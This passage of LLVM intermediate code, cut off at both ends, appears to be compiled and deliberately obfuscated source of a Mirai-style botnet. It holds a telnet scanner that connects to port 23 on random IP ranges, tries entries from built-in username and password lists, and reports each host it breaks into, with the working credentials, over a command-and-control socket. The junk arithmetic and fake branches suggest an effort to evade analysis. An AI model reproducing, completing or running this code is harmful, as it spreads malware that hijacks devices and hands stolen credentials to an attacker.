  %1261 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %1260
  %1262 = load i8*, i8** %1261, align 8
  %1263 = load i32, i32* %6, align 4
  %1264 = sext i32 %1263 to i64
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1264
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1265, i32 0, i32 5
  %1267 = load i8, i8* %1266, align 1
  %1268 = zext i8 %1267 to i64
  %1269 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %1268
  %1270 = load i8*, i8** %1269, align 8
  %1271 = call i32 (i32, i8*, ...) @sockprintf(i32 %1250, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.509, i32 0, i32 0), i8* %1254, i8* %1262, i8* %1270)
  %1272 = load i32, i32* %6, align 4
  %1273 = sext i32 %1272 to i64
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1273
  %1275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1274, i32 0, i32 0
  %1276 = load i32, i32* %1275, align 16
  %1277 = load i32, i32* %3, align 4
  %1278 = load i32, i32* %6, align 4
  %1279 = sext i32 %1278 to i64
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1279
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1280, i32 0, i32 9
  %1282 = load i8*, i8** %1281, align 8
  %1283 = call i32 @read_until_response(i32 %1276, i32 %1277, i8* %1282, i32 1024, i8** bitcast ([10 x i8]* @.str.513 to i8**))
  %1284 = icmp ne i32 %1283, 0
  br i1 %1284, label %1285, label %1341

; <label>:1285:                                   ; preds = %1249
  %1286 = load i32, i32* %6, align 4
  %1287 = sext i32 %1286 to i64
  %1288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1287
  %1289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1288, i32 0, i32 9
  %1290 = load i8*, i8** %1289, align 8
  %1291 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %1290, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.510, i32 0, i32 0))
  %1292 = icmp ne i32 %1291, 0
  br i1 %1292, label %1293, label %1324

; <label>:1293:                                   ; preds = %1285
  %1294 = load i32, i32* %6, align 4
  %1295 = sext i32 %1294 to i64
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1295
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1296, i32 0, i32 3
  %1298 = load i8, i8* %1297, align 1
  %1299 = zext i8 %1298 to i32
  %1300 = icmp ne i32 %1299, 3
  br i1 %1300, label %1301, label %1324

; <label>:1301:                                   ; preds = %1293
  %1302 = load i32, i32* @mainCommSock, align 4
  %1303 = load i32, i32* %6, align 4
  %1304 = sext i32 %1303 to i64
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1304
  %1306 = call i8* @get_telstate_host(%struct.telstate_t* %1305)
  %1307 = load i32, i32* %6, align 4
  %1308 = sext i32 %1307 to i64
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1308
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1309, i32 0, i32 4
  %1311 = load i8, i8* %1310, align 2
  %1312 = zext i8 %1311 to i64
  %1313 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %1312
  %1314 = load i8*, i8** %1313, align 8
  %1315 = load i32, i32* %6, align 4
  %1316 = sext i32 %1315 to i64
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1316
  %1318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1317, i32 0, i32 5
  %1319 = load i8, i8* %1318, align 1
  %1320 = zext i8 %1319 to i64
  %1321 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %1320
  %1322 = load i8*, i8** %1321, align 8
  %1323 = call i32 (i32, i8*, ...) @sockprintf(i32 %1302, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.511, i32 0, i32 0), i8* %1306, i8* %1314, i8* %1322)
  br label %1324

; <label>:1324:                                   ; preds = %1301, %1293, %1285
  %1325 = load i32, i32* @x.73
  %1326 = load i32, i32* @y.74
  %1327 = sub i32 %1325, 1
  %1328 = mul i32 %1325, %1327
  %1329 = urem i32 %1328, 2
  %1330 = icmp eq i32 %1329, 0
  %1331 = icmp slt i32 %1326, 10
  %1332 = or i1 %1330, %1331
  br i1 %1332, label %originalBB185, label %originalBB185alteredBB

originalBB185:                                    ; preds = %originalBB185alteredBB, %1324
  %1333 = load i32, i32* @x.73
  %1334 = load i32, i32* @y.74
  %1335 = sub i32 %1333, 1
  %1336 = mul i32 %1333, %1335
  %1337 = urem i32 %1336, 2
  %1338 = icmp eq i32 %1337, 0
  %1339 = icmp slt i32 %1334, 10
  %1340 = or i1 %1338, %1339
  br i1 %1340, label %originalBBpart2187, label %originalBB185alteredBB

originalBBpart2187:                               ; preds = %originalBB185
  br label %1341

; <label>:1341:                                   ; preds = %originalBBpart2187, %1249
  %1342 = load i32, i32* %6, align 4
  %1343 = sext i32 %1342 to i64
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1343
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1344, i32 0, i32 7
  %1346 = load i32, i32* %1345, align 16
  %1347 = add i32 %1346, 45
  %1348 = zext i32 %1347 to i64
  %1349 = call i64 @time(i64* null) #5
  %1350 = icmp slt i64 %1348, %1349
  br i1 %1350, label %1351, label %1386

; <label>:1351:                                   ; preds = %1341
  %1352 = load i32, i32* %6, align 4
  %1353 = sext i32 %1352 to i64
  %1354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1353
  %1355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1354, i32 0, i32 3
  %1356 = load i8, i8* %1355, align 1
  %1357 = zext i8 %1356 to i32
  %1358 = icmp ne i32 %1357, 3
  br i1 %1358, label %1359, label %1382

; <label>:1359:                                   ; preds = %1351
  %1360 = load i32, i32* @mainCommSock, align 4
  %1361 = load i32, i32* %6, align 4
  %1362 = sext i32 %1361 to i64
  %1363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1362
  %1364 = call i8* @get_telstate_host(%struct.telstate_t* %1363)
  %1365 = load i32, i32* %6, align 4
  %1366 = sext i32 %1365 to i64
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1366
  %1368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1367, i32 0, i32 4
  %1369 = load i8, i8* %1368, align 2
  %1370 = zext i8 %1369 to i64
  %1371 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %1370
  %1372 = load i8*, i8** %1371, align 8
  %1373 = load i32, i32* %6, align 4
  %1374 = sext i32 %1373 to i64
  %1375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1374
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1375, i32 0, i32 5
  %1377 = load i8, i8* %1376, align 1
  %1378 = zext i8 %1377 to i64
  %1379 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %1378
  %1380 = load i8*, i8** %1379, align 8
  %1381 = call i32 (i32, i8*, ...) @sockprintf(i32 %1360, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.512, i32 0, i32 0), i8* %1364, i8* %1372, i8* %1380)
  br label %1382

; <label>:1382:                                   ; preds = %1359, %1351
  %1383 = load i32, i32* %6, align 4
  %1384 = sext i32 %1383 to i64
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1384
  call void @reset_telstate(%struct.telstate_t* %1385)
  br label %1386

; <label>:1386:                                   ; preds = %1382, %1341
  br label %1387

; <label>:1387:                                   ; preds = %1386, %1152, %1079, %originalBBpart2140, %originalBBpart2136, %originalBBpart2124, %originalBBpart2108, %529, %360, %122
  br label %1388

; <label>:1388:                                   ; preds = %1387, %1245, %originalBBpart2175, %1093, %originalBBpart2156, %876, %864, %807, %originalBBpart2120, %671, %582, %494, %490, %309, %246
  %1389 = load i32, i32* %6, align 4
  %1390 = add nsw i32 %1389, 1
  store i32 %1390, i32* %6, align 4
  br label %88

; <label>:1391:                                   ; preds = %88
  br label %86
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %69
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %99
  %1393 = call i64 @time(i64* null) #5
  %1394 = trunc i64 %1393 to i32
  %1395 = load i32, i32* %6, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1396
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1397, i32 0, i32 7
  store i32 %1394, i32* %1398, align 16
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %129
  %1399 = load i32, i32* %6, align 4
  %1400 = sext i32 %1399 to i64
  %1401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1400
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1401, i32 0, i32 3
  %1403 = load i8, i8* %1402, align 1
  %1404 = zext i8 %1403 to i32
  %1405 = icmp eq i32 %1404, 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %153
  %1406 = load i32, i32* %6, align 4
  %1407 = sext i32 %1406 to i64
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1407
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1408, i32 0, i32 9
  %1410 = load i8*, i8** %1409, align 8
  store i8* %1410, i8** %20, align 8
  %1411 = load i32, i32* %6, align 4
  %1412 = sext i32 %1411 to i64
  %1413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1412
  %1414 = bitcast %struct.telstate_t* %1413 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1414, i8 0, i64 32, i32 16, i1 false)
  %1415 = load i8*, i8** %20, align 8
  %1416 = load i32, i32* %6, align 4
  %1417 = sext i32 %1416 to i64
  %1418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1417
  %1419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1418, i32 0, i32 9
  store i8* %1415, i8** %1419, align 8
  %1420 = call i32 @MiraiIPRanges()
  %1421 = load i32, i32* %6, align 4
  %1422 = sext i32 %1421 to i64
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1422
  %1424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1423, i32 0, i32 1
  store i32 %1420, i32* %1424, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %222
  %1425 = load i32, i32* %6, align 4
  %1426 = sext i32 %1425 to i64
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1426
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1427, i32 0, i32 4
  %1429 = load i8, i8* %1428, align 2
  %1430 = zext i8 %1429 to i64
  %1431 = icmp eq i64 %1430, 34
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %252
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %269
  %1432 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %1432, align 4
  %1433 = call zeroext i16 @htons(i16 zeroext 23) #10
  %1434 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %1433, i16* %1434, align 2
  %1435 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %1436 = getelementptr inbounds [8 x i8], [8 x i8]* %1435, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1436, i8 0, i64 8, i32 4, i1 false)
  %1437 = load i32, i32* %6, align 4
  %1438 = sext i32 %1437 to i64
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1438
  %1440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1439, i32 0, i32 1
  %1441 = load i32, i32* %1440, align 4
  %1442 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %1443 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1442, i32 0, i32 0
  store i32 %1441, i32* %1443, align 4
  %1444 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %1445 = load i32, i32* %6, align 4
  %1446 = sext i32 %1445 to i64
  %1447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1446
  %1448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1447, i32 0, i32 0
  store i32 %1444, i32* %1448, align 16
  %1449 = load i32, i32* %6, align 4
  %1450 = sext i32 %1449 to i64
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1450
  %1452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1451, i32 0, i32 0
  %1453 = load i32, i32* %1452, align 16
  %1454 = icmp eq i32 %1453, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %340
  %1455 = load i32, i32* %6, align 4
  %1456 = sext i32 %1455 to i64
  %1457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1456
  call void @advance_telstate(%struct.telstate_t* %1457, i32 1)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %362
  %1458 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %1459 = getelementptr inbounds [16 x i64], [16 x i64]* %1458, i64 0, i64 0
  %1460 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %1459) #5, !srcloc !6
  %1461 = extractvalue { i64, i64* } %1460, 0
  %1462 = extractvalue { i64, i64* } %1460, 1
  %1463 = trunc i64 %1461 to i32
  store i32 %1463, i32* %21, align 4
  %1464 = ptrtoint i64* %1462 to i64
  %1465 = trunc i64 %1464 to i32
  store i32 %1465, i32* %22, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %388
  %1466 = load i32, i32* %6, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1467
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1468, i32 0, i32 0
  %1470 = load i32, i32* %1469, align 16
  %_ = sub i32 0, %1470
  %gen = add i32 %_, 64
  %_35 = sub i32 %1470, 64
  %gen36 = mul i32 %_35, 64
  %_37 = shl i32 %1470, 64
  %_38 = shl i32 %1470, 64
  %_39 = sub i32 %1470, 64
  %gen40 = mul i32 %_39, 64
  %_41 = sub i32 %1470, 64
  %gen42 = mul i32 %_41, 64
  %1471 = srem i32 %1470, 64
  %1472 = zext i32 %1471 to i64
  %_43 = sub i64 1, %1472
  %gen44 = mul i64 %_43, %1472
  %_45 = shl i64 1, %1472
  %_46 = shl i64 1, %1472
  %_47 = sub i64 0, 1
  %gen48 = add i64 %_47, %1472
  %_49 = shl i64 1, %1472
  %1473 = shl i64 1, %1472
  %1474 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %1475 = load i32, i32* %6, align 4
  %1476 = sext i32 %1475 to i64
  %1477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1476
  %1478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1477, i32 0, i32 0
  %1479 = load i32, i32* %1478, align 16
  %_50 = shl i32 %1479, 64
  %_51 = sub i32 %1479, 64
  %gen52 = mul i32 %_51, 64
  %_53 = shl i32 %1479, 64
  %_54 = sub i32 0, %1479
  %gen55 = add i32 %_54, 64
  %1480 = sdiv i32 %1479, 64
  %1481 = sext i32 %1480 to i64
  %1482 = getelementptr inbounds [16 x i64], [16 x i64]* %1474, i64 0, i64 %1481
  %1483 = load i64, i64* %1482, align 8
  %_56 = shl i64 %1483, %1473
  %1484 = or i64 %1483, %1473
  store i64 %1484, i64* %1482, align 8
  %1485 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %1485, align 8
  %1486 = load i32, i32* %3, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %1487, i64* %1488, align 8
  %1489 = load i32, i32* %6, align 4
  %1490 = sext i32 %1489 to i64
  %1491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1490
  %1492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1491, i32 0, i32 0
  %1493 = load i32, i32* %1492, align 16
  %_57 = sub i32 %1493, 1
  %gen58 = mul i32 %_57, 1
  %_59 = sub i32 %1493, 1
  %gen60 = mul i32 %_59, 1
  %_61 = sub i32 0, %1493
  %gen62 = add i32 %_61, 1
  %_63 = shl i32 %1493, 1
  %_64 = sub i32 %1493, 1
  %gen65 = mul i32 %_64, 1
  %1494 = add nsw i32 %1493, 1
  %1495 = call i32 @select(i32 %1494, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %1495, i32* %7, align 4
  %1496 = load i32, i32* %7, align 4
  %1497 = icmp eq i32 %1496, 1
  br label %originalBB34

originalBB69alteredBB:                            ; preds = %originalBB69, %457
  %1498 = load i32, i32* %6, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1499
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1500, i32 0, i32 0
  %1502 = load i32, i32* %1501, align 16
  %1503 = load i32, i32* %6, align 4
  %1504 = sext i32 %1503 to i64
  %1505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1504
  %1506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1505, i32 0, i32 0
  %1507 = load i32, i32* %1506, align 16
  %1508 = call i32 (i32, i32, ...) @fcntl(i32 %1507, i32 3, i8* null)
  %_70 = sub i32 %1508, -2049
  %gen71 = mul i32 %_70, -2049
  %_72 = sub i32 0, %1508
  %gen73 = add i32 %_72, -2049
  %_74 = shl i32 %1508, -2049
  %_75 = shl i32 %1508, -2049
  %_76 = sub i32 %1508, -2049
  %gen77 = mul i32 %_76, -2049
  %_78 = shl i32 %1508, -2049
  %1509 = and i32 %1508, -2049
  %1510 = call i32 (i32, i32, ...) @fcntl(i32 %1502, i32 4, i32 %1509)
  %1511 = load i32, i32* %6, align 4
  %1512 = sext i32 %1511 to i64
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1512
  call void @advance_telstate(%struct.telstate_t* %1513, i32 2)
  br label %originalBB69

originalBB82alteredBB:                            ; preds = %originalBB82, %498
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %544
  %1514 = call i64 @time(i64* null) #5
  %1515 = trunc i64 %1514 to i32
  %1516 = load i32, i32* %6, align 4
  %1517 = sext i32 %1516 to i64
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1517
  %1519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1518, i32 0, i32 7
  store i32 %1515, i32* %1519, align 16
  %1520 = load i32, i32* %6, align 4
  %1521 = sext i32 %1520 to i64
  %1522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1521
  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1522, i32 0, i32 9
  %1524 = load i8*, i8** %1523, align 8
  %1525 = call i32 @contains_fail(i8* %1524)
  %1526 = icmp ne i32 %1525, 0
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %583
  %1527 = load i32, i32* %6, align 4
  %1528 = sext i32 %1527 to i64
  %1529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1528
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1529, i32 0, i32 7
  %1531 = load i32, i32* %1530, align 16
  %_91 = sub i32 %1531, 7
  %gen92 = mul i32 %_91, 7
  %_93 = sub i32 %1531, 7
  %gen94 = mul i32 %_93, 7
  %_95 = sub i32 0, %1531
  %gen96 = add i32 %_95, 7
  %_97 = shl i32 %1531, 7
  %_98 = sub i32 %1531, 7
  %gen99 = mul i32 %_98, 7
  %_100 = sub i32 %1531, 7
  %gen101 = mul i32 %_100, 7
  %_102 = shl i32 %1531, 7
  %1532 = add i32 %1531, 7
  %1533 = zext i32 %1532 to i64
  %1534 = call i64 @time(i64* null) #5
  %1535 = icmp slt i64 %1533, %1534
  br label %originalBB90

originalBB106alteredBB:                           ; preds = %originalBB106, %613
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %630
  %1536 = load i32, i32* %6, align 4
  %1537 = sext i32 %1536 to i64
  %1538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1537
  %1539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1538, i32 0, i32 0
  %1540 = load i32, i32* %1539, align 16
  %1541 = load i32, i32* %6, align 4
  %1542 = sext i32 %1541 to i64
  %1543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1542
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1543, i32 0, i32 4
  %1545 = load i8, i8* %1544, align 2
  %1546 = zext i8 %1545 to i64
  %1547 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %1546
  %1548 = load i8*, i8** %1547, align 8
  %1549 = load i32, i32* %6, align 4
  %1550 = sext i32 %1549 to i64
  %1551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1550
  %1552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1551, i32 0, i32 4
  %1553 = load i8, i8* %1552, align 2
  %1554 = zext i8 %1553 to i64
  %1555 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %1554
  %1556 = load i8*, i8** %1555, align 8
  %1557 = call i64 @strlen(i8* %1556) #9
  %1558 = call i64 @send(i32 %1540, i8* %1548, i64 %1557, i32 16384)
  %1559 = icmp slt i64 %1558, 0
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %675
  %1560 = load i32, i32* %6, align 4
  %1561 = sext i32 %1560 to i64
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1561
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1562, i32 0, i32 0
  %1564 = load i32, i32* %1563, align 16
  %1565 = call i64 @send(i32 %1564, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %1566 = icmp slt i64 %1565, 0
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %699
  %1567 = load i32, i32* %6, align 4
  %1568 = sext i32 %1567 to i64
  %1569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1568
  call void @reset_telstate(%struct.telstate_t* %1569)
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %719
  %1570 = load i32, i32* %6, align 4
  %1571 = sext i32 %1570 to i64
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1571
  call void @advance_telstate(%struct.telstate_t* %1572, i32 4)
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %739
  %1573 = load i32, i32* %6, align 4
  %1574 = sext i32 %1573 to i64
  %1575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1574
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1575, i32 0, i32 0
  %1577 = load i32, i32* %1576, align 16
  %1578 = load i32, i32* %3, align 4
  %1579 = load i32, i32* %6, align 4
  %1580 = sext i32 %1579 to i64
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1580
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1581, i32 0, i32 9
  %1583 = load i8*, i8** %1582, align 8
  %1584 = call i32 @read_until_response(i32 %1577, i32 %1578, i8* %1583, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %1585 = icmp ne i32 %1584, 0
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %769
  %1586 = call i64 @time(i64* null) #5
  %1587 = trunc i64 %1586 to i32
  %1588 = load i32, i32* %6, align 4
  %1589 = sext i32 %1588 to i64
  %1590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1589
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1590, i32 0, i32 7
  store i32 %1587, i32* %1591, align 16
  %1592 = load i32, i32* %6, align 4
  %1593 = sext i32 %1592 to i64
  %1594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1593
  %1595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1594, i32 0, i32 9
  %1596 = load i8*, i8** %1595, align 8
  %1597 = call i32 @contains_fail(i8* %1596)
  %1598 = icmp ne i32 %1597, 0
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %822
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %880
  %1599 = load i32, i32* %6, align 4
  %1600 = sext i32 %1599 to i64
  %1601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1600
  call void @advance_telstate(%struct.telstate_t* %1601, i32 6)
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %900
  %1602 = load i32, i32* %6, align 4
  %1603 = sext i32 %1602 to i64
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1603
  %1605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1604, i32 0, i32 0
  %1606 = load i32, i32* %1605, align 16
  %1607 = load i32, i32* %3, align 4
  %1608 = load i32, i32* %6, align 4
  %1609 = sext i32 %1608 to i64
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1609
  %1611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1610, i32 0, i32 9
  %1612 = load i8*, i8** %1611, align 8
  %1613 = call i32 @read_until_response(i32 %1606, i32 %1607, i8* %1612, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %1614 = icmp ne i32 %1613, 0
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %968
  %1615 = load i32, i32* @mainCommSock, align 4
  %1616 = load i32, i32* %6, align 4
  %1617 = sext i32 %1616 to i64
  %1618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1617
  %1619 = call i8* @get_telstate_host(%struct.telstate_t* %1618)
  %1620 = load i32, i32* %6, align 4
  %1621 = sext i32 %1620 to i64
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1621
  %1623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1622, i32 0, i32 4
  %1624 = load i8, i8* %1623, align 2
  %1625 = zext i8 %1624 to i64
  %1626 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %1625
  %1627 = load i8*, i8** %1626, align 8
  %1628 = load i32, i32* %6, align 4
  %1629 = sext i32 %1628 to i64
  %1630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1629
  %1631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1630, i32 0, i32 5
  %1632 = load i8, i8* %1631, align 1
  %1633 = zext i8 %1632 to i64
  %1634 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %1633
  %1635 = load i8*, i8** %1634, align 8
  %1636 = call i32 (i32, i8*, ...) @sockprintf(i32 %1615, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.502, i32 0, i32 0), i8* %1619, i8* %1627, i8* %1635)
  %1637 = load i32, i32* %6, align 4
  %1638 = sext i32 %1637 to i64
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1638
  call void @advance_telstate(%struct.telstate_t* %1639, i32 7)
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1015
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1032
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1049
  %1640 = load i32, i32* %6, align 4
  %1641 = sext i32 %1640 to i64
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1641
  %1643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1642, i32 0, i32 7
  %1644 = load i32, i32* %1643, align 16
  %_159 = shl i32 %1644, 7
  %_160 = sub i32 0, %1644
  %gen161 = add i32 %_160, 7
  %_162 = shl i32 %1644, 7
  %_163 = shl i32 %1644, 7
  %_164 = sub i32 0, %1644
